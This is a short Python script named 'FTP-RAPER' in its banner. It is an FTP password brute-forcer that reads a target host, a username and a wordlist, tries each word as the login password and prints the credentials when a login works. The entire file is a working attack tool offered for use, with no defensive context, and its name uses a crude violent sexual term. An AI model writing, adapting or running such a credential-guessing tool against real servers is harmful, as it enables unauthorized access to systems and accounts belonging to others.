
import ftplib,os
os.system('clear')
print('''
  ______ _______ _____        _____            _____  ______
 |  ____|__   __|  __ \      |  __ \     /\   |  __ \|  ____|
 | |__     | |  | |__) |_____| |__) |   /  \  | |__) | |__
 |  __|    | |  |  ___/______|  _  /   / /\ \ |  ___/|  __|
 | |       | |  | |          | | \ \  / ____ \| |    | |____
 |_|       |_|  |_|          |_|  \_\/_/    \_\_|    |______|
          from FD
          NinjaHz page
          github.com/FDX100
''')

def ftp(host,username,password):

    try:

        connect = ftplib.FTP(host)
        connected_ftp=connect.login(user=username,passwd=password)
        print('\x1b[0;30;42m' +'[+] user name is '+username+' and password is '+password+' for '+host+ '\x1b[0m')
        quit()
    except ftplib.error_perm:
        print('\x1b[1;30;40m' + '[+] password is not >> '+password+ '\x1b[0m')
try:

    host = raw_input('Target Host >> ')
    username = raw_input('Target Username >> ')
    wordlist = raw_input('wordlist location >> ')
except KeyboardInterrupt:
    print('\n[+] FTP-RAPER is closing ')
    quit()    
with open(wordlist,'r')as wordlist:
    for word in wordlist:
        word = word.strip()
        try:

            ftp(host,username,word)
        except KeyboardInterrupt:
            print('\n[+] FTP-RAPER is closing ')
            quit()
